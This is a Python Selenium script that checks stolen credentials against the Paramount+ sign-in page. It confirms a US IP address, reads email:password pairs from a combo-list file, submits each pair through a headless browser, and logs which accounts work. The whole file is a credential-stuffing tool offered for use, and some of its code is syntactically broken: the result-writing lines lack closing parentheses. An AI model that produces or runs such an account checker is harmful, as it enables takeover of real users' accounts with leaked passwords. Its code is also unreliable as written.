import time
import requests
from bs4 import BeautifulSoup as soup

from selenium.common.exceptions import NoSuchElementException, ElementClickInterceptedException
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from pathlib import Path

file_directory = str(Path(__file__).parent)+'/paramount'
page = 'https://www.paramountplus.com/account/signin/'
get_current_ip = 'https://www.iplocation.net/'
info_list =[]
request = requests.get(get_current_ip)
parse_request = soup(request.content,'html.parser')
get_Location = parse_request.find('table',attrs={'class':'iptable'})
location = get_Location.find_all('td')
for line in location:
	info_list.append(line.text.strip())
if 'US' not in info_list[2]:
	print('Non-US IP\nThe Program will only work for US IP Adresses.\nEnding.')
	exit()

users = []
passwords = []
browser_options = Options()
browser_options.headless = True
browser = webdriver.Chrome(options = browser_options)
browser.set_window_size(500,700)
browser.get(page)

email_input_box = browser.find_element_by_xpath('//*[@id="email"]')
password_input_box = browser.find_element_by_xpath('//*[@id="password"]')
sign_in_button = browser.find_element_by_xpath('//*[@id="sign-in-form"]/div/div[3]/button')


with open(file_directory, 'r') as paramount:
	
	for line in paramount.readlines():
		users.append(line.split(':')[0].strip())
		passwords.append(line.split(':')[1].split(' | ')[0].strip())


for index in range(len(users)):
	with open('account_results','a') as account_results:
		try:
			email_input_box.send_keys(users[index])
			password_input_box.send_keys(passwords[index])
			sign_in_button.click()
			time.sleep(1)
			GDPR_Reject_all_button = browser.find_element_by_xpath('/html/body/div/div[3]/div/div/div[2]/div/div/button[2]')
			time.sleep(1)
			GDPR_Reject_all_button.click()	
			time.sleep(2)	
			invalid_email_text = browser.find_element_by_xpath('//*[@id="main-aa-container"]/section/div/div[1]/p')
			error = invalid_email_text.text
			if 'Invalid email and/or password' in str(error):		
				account_results.write('{}:{} ---> Bad Account'.format(users[index],passwords[index])
		except (NoSuchElementException, ElementClickInterceptedException):
			account_results.write('{}:{} ---> Good Account'.format(users[index],passwords[index])
			continue
	
	
# //*[@id="main-aa-container"]/section/div/div[1]/p
